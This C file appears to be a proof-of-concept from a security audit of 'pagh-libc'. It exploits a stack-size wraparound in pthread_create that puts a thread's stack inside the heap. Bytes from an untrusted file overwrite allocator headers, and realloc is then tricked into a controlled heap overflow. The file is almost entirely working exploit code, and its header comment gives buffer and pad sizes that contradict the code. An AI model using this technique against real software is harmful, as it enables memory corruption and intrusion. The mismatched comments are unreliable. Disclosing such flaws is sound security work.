/* F-r4-rt-1, escalated: pagh-libc 0.15.3 pthread_create() rounds a
 * caller-supplied stack size without checking the wrap, so `(size_t)-1`
 * becomes a ZERO-byte stack.  malloc(0) succeeds and hands back a 16-byte
 * header block, so the new thread's `sp` is an address INSIDE THE HEAP.
 *
 * This PoC gives the thread the most ordinary body imaginable: a worker that
 * copies a request it read from a file into a local buffer.  There is no bug
 * in the worker - the buffer is exactly as long as the data.  Because the
 * "stack" is a heap block, that copy lands on the live allocations below it,
 * including their 16-byte allocator headers, so bytes from the untrusted file
 * become heap metadata.
 *
 * Layout (heap base HB):
 *   pad       malloc(1024)  -> gives the frame somewhere to live
 *   victim    malloc(64)    -> header + data, canary filled
 *   "stack"   malloc(0)     -> 16-byte header, sp = its data pointer
 *   start     malloc(24)    -> struct thread_start
 * The worker's 256-byte buffer is written from sp downward: over `start`'s
 * header, over the stack's own header, over victim's data and header, over
 * pad.  The attacker chooses every one of those bytes.
 *
 * Then realloc(victim, 4096) consults the header the attacker wrote and, if
 * the value is large, hands the 64-byte block back as a 4096-byte block.
 */
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define PAD_BYTES 4096
#define VICTIM_BYTES 64
#define CANARY 0x5A

static unsigned char *pad;
static unsigned char *victim;

static void *worker(void *arg) {
    const char *path = (const char *)arg;
    /* The worker's only stack: a request buffer.  Nobody overflows it. */
    char buf[768];
    int fd = open(path, O_RDONLY, 0);
    if (fd < 0) return (void *)1;
    long n = read(fd, buf, sizeof buf);
    close(fd);
    if (n <= 0) return (void *)2;
    /* `buf` is the thread's entire stack: the request bytes just landed on
     * the allocator headers of the live blocks below it. */
    printf("BUF %lx N %ld FIRST %02x\n", (unsigned long)buf, n,
           (unsigned char)buf[0]);
    return (void *)(long)n;
}

static int changed(const unsigned char *p, int n) {
    int hits = 0;
    for (int i = 0; i < n; i++) {
        if (p[i] != CANARY) hits++;
    }
    return hits;
}

int main(int argc, char **argv) {
    const char *path = argc > 1 ? argv[1] : "/mnt/request.bin";
    pad = malloc(PAD_BYTES);
    victim = malloc(VICTIM_BYTES);
    if (!pad || !victim) {
        printf("ALLOC FAILED\n");
        return 1;
    }
    memset(pad, 0x11, PAD_BYTES);
    memset(victim, CANARY, VICTIM_BYTES);
    printf("PAD %lx VICTIM %lx\n", (unsigned long)pad, (unsigned long)victim);

    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setstacksize(&attr, (size_t)-1);
    printf("REQUESTED STACK SIZE %lu\n", (unsigned long)(size_t)-1);

    pthread_t thread;
    int rc = pthread_create(&thread, &attr, worker, (void *)path);
    printf("PTHREAD CREATE rc=%d\n", rc);
    if (rc != 0) {
        printf("PTHREAD STACK REFUSED\n");
        return 2;
    }
    pthread_join(thread, NULL);

    int hits = changed(victim, VICTIM_BYTES);
    printf("VICTIM changed=%d/%d\n", hits, VICTIM_BYTES);
    if (hits == 0) {
        printf("CANARY OK\n");
        return 0;
    }
    printf("VICTIM NOW: ");
    for (int i = 0; i < 16; i++) printf("%02x", victim[i]);
    printf("\n");
    printf("CHANGED AT:");
    for (int i = 0; i < VICTIM_BYTES; i++) {
        if (victim[i] != CANARY) printf(" %d", i);
    }
    printf("\n");

    /* The attacker's bytes are the block header now.  realloc() reads them. */
    unsigned char *grown = realloc(victim, 4096);
    if (grown == victim) {
        printf("REALLOC TRUSTED ATTACKER HEADER\n");
        memset(grown, 0xBB, 4096);
        printf("CONTROLLED OVERFLOW WRITE DONE\n");
    } else {
        printf("REALLOC MOVED THE BLOCK\n");
    }
    printf("UNTRUSTED REQUEST BECAME HEAP METADATA\n");
    return 3;
}